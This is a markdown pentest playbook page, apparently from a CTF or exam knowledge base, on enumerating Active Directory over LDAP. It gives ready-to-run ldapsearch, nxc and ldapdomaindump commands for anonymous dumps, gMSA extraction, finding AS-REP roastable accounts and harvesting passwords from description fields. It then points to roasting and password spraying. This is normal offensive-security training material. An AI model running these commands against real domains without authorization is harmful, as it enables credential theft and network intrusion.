---
id: ldap-enum
title: LDAP Enumeration
stage: enumeration
tags: [windows, ad, ldap]
summary: Extract the full AD object tree — users, groups, descriptions, and pre-auth flags — often without credentials.
leads_to:
  - asreproast
  - kerberoast
  - password-spray
---

## Prerequisites

- Port 389 (LDAP) or 636 (LDAPS) open

- Anonymous bind frequently works on domain controllers in lab environments — try it first

- An anonymous bind can dump every user, group, computer, and description in the domain

- Description fields routinely contain plaintext passwords in CTF and exam environments

- `userAccountControl` flags accounts with no Kerberos pre-auth required — that's your AS-REP roast list

## Quick Win

> Anonymous bind — get full user list without credentials.

```bash
nxc ldap $TARGET -u '' -p '' --users
ldapsearch -H ldap://$TARGET -x -b "" -s base namingContexts
```

## Full Anonymous Dump

> Dump every object — pipe through grep to extract usernames and descriptions.

```bash
ldapsearch -H ldap://$TARGET -x -b "DC=domain,DC=local" -s sub "(objectClass=*)" \
  | grep -iE "sAMAccountName|description|mail|memberOf|userAccountControl"

# Structured HTML/JSON dump for offline reading
ldapdomaindump -u '' $TARGET
```

## Authenticated Enumeration

> With credentials — more complete data including ACLs, group memberships, and gMSA accounts.

```bash
ldapsearch -H ldap://$TARGET -x -D "cn=user,dc=domain,dc=local" -w password -b "dc=domain,dc=local"
nxc ldap $TARGET -u user -p password --users
nxc ldap $TARGET -u user -p password --gmsa
```

## Hunt AS-REP Roastable Accounts

> Accounts with DONT_REQ_PREAUTH set — no credential needed to request their hash.

```bash
ldapsearch -H ldap://$TARGET -x -b "DC=domain,DC=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```

## Hunt Descriptions for Credentials

> Admins frequently store passwords in description fields — check every account.

```bash
ldapsearch -H ldap://$TARGET -x -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName description
```

## Leads To

- User list obtained → test with `asreproast` immediately (no creds needed)

- Description field password found → `password-spray` across all protocols

- AS-REP roastable accounts found → `asreproast` → crack → authenticate

- User list + domain name → `kerberoast` once you have credentials
